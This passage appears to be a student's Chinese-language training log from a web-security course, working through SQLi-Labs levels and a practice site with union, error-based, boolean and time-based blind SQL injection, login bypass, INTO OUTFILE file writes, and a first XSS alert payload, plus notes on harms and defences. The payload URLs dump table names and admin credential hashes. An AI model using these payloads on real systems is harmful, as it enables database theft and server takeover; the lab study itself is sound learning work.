<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&quot;double_fish&quot;;</span><br><span class="line"></span><br><span class="line">select * from t_xx where col_xx =-1 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=&quot;double_fish&quot;;</span><br><span class="line"></span><br><span class="line">select * from t_xx where col_xx =-1 union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=&quot;double_fish&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/News/newsView.php?newsId=-1 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=‘double_fish’</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712144836784.png" alt="image-20220712144836784"></p>
<p>4.获取管理员表下列名  username password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx =-1 union select 1,2,group_concat(column_name),4,5 from information_schema.columns where table_schema=&quot;double_fish&quot; and table_name=&quot;t_admin&quot;;</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/News/newsView.php?newsId=-1 union select 1,2,group_concat(column_name),4,5 from information_schema.columns where table_schema=‘double_fish’ and table_name=‘t_admin’</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712142455748.png" alt="image-20220712142455748"></p>
<p>5 获取管理员账号密码hash。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select username, password from t_admin;</span><br><span class="line">select * from t_xx where col_xx =-1 union select 1,username, password,4,5 from t_admin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newsId=-1 union select 1,username,password,4,5 from t_admin</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712142819942.png" alt="image-20220712142819942"></p>
<h3 id="任务五"><a href="#任务五" class="headerlink" title="任务五"></a>任务五</h3><p>先听讲，再练习</p>
<p>先听讲，再练习。该任务无需写报告。 利用查看学生信息的注入点，完成模拟教务系统（<a target="_blank" rel="noopener" href="http://www.wabjtam.ml:12880/%EF%BC%89%E7%9A%84%E6%B3%A8%E5%85%A5%EF%BC%8C%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE">http://www.wabjtam.ml:12880/）的注入，获取数据</a> 库名。</p>
<ol start="0">
<li><p>猜测后台查询语句 select * from t_xx where col_xx &#x3D;’201721343’ order by 100#’ limit xxx; </p>
</li>
<li><p>获取列数：13 </p>
</li>
<li><p>获取库名：</p>
<p>double_fish database() select database(); </p>
<p><a target="_blank" rel="noopener" href="http://www.wabjtam.ml:12880/Student/studentView.php?studentNumber=201721343&#39;">http://www.wabjtam.ml:12880/Student/studentView.php?studentNumber=201721343&#39;</a> order by 13%23 <a target="_blank" rel="noopener" href="http://www.wabjtam.ml:12880/Student/studentView.php?studentNumber=201721343&#39;">http://www.wabjtam.ml:12880/Student/studentView.php?studentNumber=201721343&#39;</a> union select 1,2,3,4,5,6,7,8,9,10,11,database(),13%2</p>
</li>
</ol>
<h3 id="任务六完成SQLi-Labs第一关的注入"><a href="#任务六完成SQLi-Labs第一关的注入" class="headerlink" title="任务六完成SQLi-Labs第一关的注入"></a>任务六完成SQLi-Labs第一关的注入</h3><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712154223539.png" alt="image-20220712154223539"></p>
<p>0.猜测后台查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=1 asdfassdf;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.判断类型和闭合符</p>
<p>加单引号，看报错来判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=&#x27;1&#x27; LIMIT 0,1;</span><br></pre></td></tr></table></figure>

<p>2.判断列数：3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=&#x27;1‘order by 10%23&#x27; LIMIT 0,1;</span><br></pre></td></tr></table></figure>

<p>3.判断显示位：2，3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=&#x27;-1‘ union select 1,2,3%23&#x27; LIMIT 0,1;</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php?</span><br><span class="line">id=-1%27%20union%20select%201,2,3%23</span><br></pre></td></tr></table></figure>



<p>4.找出数据库名：security</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=&#x27;-1‘ union select 1,database(),3%23&#x27; LIMIT 0,1;</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php?id=-1%27%20union%20select%201,database(),3%23%27%20LIMIT%200,1;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712154659242.png" alt="image-20220712154659242"></p>
<p>5.找到所有表名 emails,referers,uagents,users</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=&#x27;-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;%23;</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20informatio</span><br><span class="line">n_schema.tables%20where%20table_schema=%27security%27%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712154929671.png" alt="image-20220712154929671"></p>
<p>6.找到users表中的列名 id,username,password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=&#x27;-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712155047146.png" alt="image-20220712155047146"></p>
<p>7.查询用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=&#x27;-1&#x27; union select 1,group_concat(concat_ws(&#x27;|&#x27;,username,password)),3 from users%23</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php?id=-1%27%20union%20select%201,group_concat(concat_ws(%27|%27,username,password)%20),password%20from%20users%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712155529843.png" alt="image-20220712155529843"></p>
<h3 id="任务七完成SQLi-Labs第二关至第五关的注入"><a href="#任务七完成SQLi-Labs第二关至第五关的注入" class="headerlink" title="任务七完成SQLi-Labs第二关至第五关的注入"></a>任务七完成SQLi-Labs第二关至第五关的注入</h3><p>第二关是数字型</p>
<p>第三关是字符型</p>
<p>0.猜测后台查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=1 asdfassdf;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.判断类型和闭合符</p>
<p>加单引号，看报错来判断</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712164139902.png" alt="image-20220712164139902"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712164216203.png" alt="image-20220712164216203"></p>
<img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712164241904.png" alt="image-20220712164241904" style="zoom:33%;">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=(&#x27;1&#x27;) LIMIT 0,1;</span><br></pre></td></tr></table></figure>

<p>2.判断列数：3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=(&#x27;1&#x27;)order by 10%23</span><br></pre></td></tr></table></figure>

<p>3.判断显示位：2，3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=(&#x27;-1&#x27;) union select 1,2,3%23</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php?</span><br><span class="line">id=-1%27%20union%20select%201,2,3%23</span><br></pre></td></tr></table></figure>



<p>4.找出数据库名：security</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=(&#x27;-1&#x27;) union select 1,database(),3%23&#x27; LIMIT 0,1;</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php?id=-1%27%20union%20select%201,database(),3%23%27%20LIMIT%200,1;</span><br></pre></td></tr></table></figure>



<p>5.找到所有表名 emails,referers,uagents,users</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=(&#x27;-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;%23</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20informatio</span><br><span class="line">n_schema.tables%20where%20table_schema=%27security%27%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>6.找到users表中的列名 id,username,password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=(&#x27;-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%23</span><br></pre></td></tr></table></figure>

<p>7.查询用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx=(&#x27;-1&#x27;) union select 1,group_concat(concat_ws(&#x27;|&#x27;,username,password)),3 from users%23</span><br><span class="line"></span><br><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-1/index.php?id=-1%27%20union%20select%201,group_concat(concat_ws(%27|%27,username,password)%20),password%20from%20users%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712164011820.png" alt="image-20220712164011820"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712163932713.png" alt="image-20220712163932713"></p>
<h4 id="第四关：闭合符号是“）"><a href="#第四关：闭合符号是“）" class="headerlink" title="第四关：闭合符号是“）"></a>第四关：闭合符号是“）</h4><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712170308804.png" alt="image-20220712170308804"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712170509191.png" alt="image-20220712170509191"></p>
<p>第五关：</p>
<p>用bool盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-5/index.php?id=2%27%20and%20ascii(mid(database(),3,3))%3E98%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712172258241.png" alt="image-20220712172258241"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712172326203.png" alt="image-20220712172326203"></p>
<p>ascii(mid(database(),1,1))</p>
<p>可以看出第一个词ascii码为115，为s</p>
<p>这样可以得到单词为security</p>
<p>前两位为se</p>
<h2 id="0713第三天"><a href="#0713第三天" class="headerlink" title="0713第三天"></a>0713第三天</h2><h3 id="任务一-安装SQLi-Labs"><a href="#任务一-安装SQLi-Labs" class="headerlink" title="任务一.安装SQLi-Labs"></a>任务一.安装SQLi-Labs</h3><ol>
<li><p>复制sqli-labs文件夹到网站根目录下</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713091516171.png" alt="image-20220713091516171"></p>
</li>
<li><p>修改该文件夹下的&#x2F;sql-connections&#x2F;db-creds.inc文件的内容，将$dbpass &#x3D;’’;修改为$dbpass &#x3D;’root’;</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713091539327.png" alt="image-20220713091539327"></p>
</li>
<li><p>浏览器访问sqli-labs，点击“[Setup&#x2F;reset Database for labs]”链接。</p>
</li>
</ol>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713091604086.png" alt="image-20220713091604086"></p>
<h3 id="任务二-访问自己靶机的sqli-labs，完成五到十二关"><a href="#任务二-访问自己靶机的sqli-labs，完成五到十二关" class="headerlink" title="任务二.访问自己靶机的sqli-labs，完成五到十二关"></a>任务二.访问自己靶机的sqli-labs，完成五到十二关</h3><h4 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h4><h6 id="用bool盲注"><a href="#用bool盲注" class="headerlink" title="用bool盲注"></a>用bool盲注</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wabjtam.ml:12880/sqli-labs/Less-5/index.php?id=2%27%20and%20ascii(mid(database(),3,3))%3E98%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712172258241.png" alt="image-20220712172258241"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712172326203.png" alt="image-20220712172326203"></p>
<p>ascii(mid(database(),1,1))</p>
<p>可以看出第一个词ascii码为115，为s</p>
<p>这样可以得到单词为security</p>
<p>前两位为se</p>
<p>写文件语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;abc&quot; into outfile &quot;c:/test.txt&quot;</span><br></pre></td></tr></table></figure>

<h6 id="用报错注入"><a href="#用报错注入" class="headerlink" title="用报错注入"></a>用报错注入</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,(extractvalue(1,concat(0x7e,(payload),0x7e))),3%23</span><br><span class="line">union select 1,(extractvalue(1,concat(0x7e,(database()),0x7e))),3%23</span><br><span class="line"></span><br><span class="line">http://192.168.68.132/sqli-labs/Less-5/?id=%201%27union%20select%201,(extractvalue(1,concat(0x7e,(database()),0x7e))),3%23//找出库名</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713103605157.png" alt="image-20220713103605157"></p>
<p>找出库中所有表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1&#x27;union select 1,(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e))),3%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713104351913.png" alt="image-20220713104351913"></p>
<h3 id><a href="#" class="headerlink" title></a></h3><h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p>完成第7关，写入c:&#x2F;test00.txt</p>
<p>tip:</p>
<p>1’)) union select 1,2,”666888” into outfile “c:&#x2F;test00.txt”%23</p>
<p>文件注入</p>
<p>使用一句话木马</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713093839260.png" alt="image-20220713093839260"></p>
<p>单独加‘报错，是因为只闭合了’，还有别的没闭合。所以报错了，造成了闭合冲突</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713093901936.png" alt="image-20220713093901936"></p>
<p>可以判断出闭合符为’))</p>
<p>向靶机的c盘中写入文件</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713093624940.png" alt="image-20220713093624940"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713093652542.png" alt="image-20220713093652542"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;)) union select 1,2,&quot;666888&quot; into outfile &quot;c:/test1.txt&quot;%23</span><br></pre></td></tr></table></figure>

<h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p>判断闭合符为‘</p>
<p>用bool盲注</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713135735359.png" alt="image-20220713135735359"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713135812796.png" alt="image-20220713135812796"></p>
<p>判断第一个字符ascii码为115，为s</p>
<h4 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h4><p>第9关，联用if和sleep函数进行延时盲注</p>
<p>通过时间差异反推布尔表达式是否成立，进而利用二分法逼出布尔表达式中查询内容的正确值。</p>
<p>id&#x3D;-1，1都是you are in</p>
<p>对应真实场景是各种执行都返回首页</p>
<p>用sleep或if函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)%23</span><br><span class="line">出现延时，说明闭合符为&#x27;</span><br></pre></td></tr></table></figure>

<p>闭合符为’’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and if(ascii(mid(database(),1,1))&gt;110,sleep(1),0)</span><br><span class="line"></span><br><span class="line">http://192.168.68.132/sqli-labs/Less-9/?id=1%27%20and%20if(ascii(mid(database(),1,1))%3E114,sleep(5),0)%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713101950445.png" alt="image-20220713101950445"></p>
<p>网页标签上会出现等待的圆圈</p>
<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p>判断出闭合符是“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.68.132/sqli-labs/Less-10/?id=1%22%20and%20sleep(5)%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713135543723.png" alt="image-20220713135543723"></p>
<h4 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h4><p>猜测查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t_x where xcol_username=&#x27;name&#x27; and xcol_password=&#x27;pass&#x27;</span><br><span class="line">select * from t_x where xcol_username=&#x27;name&#x27; or 1#&#x27; and xcol_password=&#x27;pass&#x27; //会查出记录</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713110743466.png" alt="image-20220713110743466"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713110830603.png" alt="image-20220713110830603"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713110934086.png" alt="image-20220713110934086"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713110958610.png" alt="image-20220713110958610"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">万能密码 or 用户名</span><br><span class="line">&#x27; or 1 #</span><br></pre></td></tr></table></figure>

<p>找出security库的所有表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713111627985.png" alt="image-20220713111627985"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713111603271.png" alt="image-20220713111603271"></p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><p>1.联合查询注入</p>
<p>2.报错注入</p>
<p>3.布尔盲注</p>
<p>4.延时注入</p>
<p>5.POST注入</p>
<p>6.数字型&#x2F;字符型注入的判断及闭合符判断</p>
<h5 id="工具注入"><a href="#工具注入" class="headerlink" title="工具注入"></a>工具注入</h5><p>有SQLMap等工具可以使用</p>
<h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713140611211.png" alt="image-20220713140611211"></p>
<p>有报错说明闭合符中至少有”</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713140700277.png" alt="image-20220713140700277"></p>
<p>加)，闭合符为”)</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713141434301.png" alt="image-20220713141434301"></p>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h4 id="概念和原理"><a href="#概念和原理" class="headerlink" title="概念和原理"></a>概念和原理</h4><p>攻击者通过注入sql语句片段，导致后端执预期外的SQL查询。</p>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>条件满足的情况下，攻击者能够</p>
<p>1.拖库</p>
<p>2.读写文件</p>
<p>3.执行系统命令</p>
<p>从影响下来说，条件满足情况下，可能导致</p>
<p>1.网站数据被窃取</p>
<p>2.网站页面被篡改</p>
<p>3.服务器被攻击者控制</p>
<h4 id="防护思路"><a href="#防护思路" class="headerlink" title="防护思路"></a>防护思路</h4><p>对输入的特殊字符进行转义，比如引号等</p>
<p>正确使用预编译技术进行防御</p>
<p>非必要不开启文件和命令执行权限</p>
<p>进行库和用户的隔离</p>
<h3 id="任务三-XSS漏洞认识、利用、防护"><a href="#任务三-XSS漏洞认识、利用、防护" class="headerlink" title="任务三.XSS漏洞认识、利用、防护"></a>任务三.XSS漏洞认识、利用、防护</h3><p>XSS(cross Site Scripting),跨站脚本攻击，攻击者将自己的恶意js代码让受害者浏览器执行</p>
<h3 id="任务四-btslab练习XSS窃取cokkie并利用"><a href="#任务四-btslab练习XSS窃取cokkie并利用" class="headerlink" title="任务四.btslab练习XSS窃取cokkie并利用"></a>任务四.btslab练习XSS窃取cokkie并利用</h3><h3 id="任务五-1"><a href="#任务五-1" class="headerlink" title="任务五"></a>任务五</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wabjtam.ml:13780/XSS-LABS/level1.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713155558983.png" alt="image-20220713155558983"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713155712771.png" alt="image-20220713155712771"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713155744435.png" alt="image-20220713155744435"></p>
<h3 id="任务六"><a href="#任务六" class="headerlink" title="任务六"></a>任务六</h3><p># 当前任务8 编写一个html文件，实现打开后弹窗。</p>
<p>`&#96;&#96;<br>javascript代码示例</p>
<script>
    alert(1);
</script>

<p>`&#96;&#96;</p>
<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713160138373.png" alt="image-20220713160138373"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713162738235.png" alt="image-20220713162738235"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220713162505739.png" alt="image-20220713162505739"></p>
<p>发生了html实例化编码</p>
<p>拼接js、截断</p>
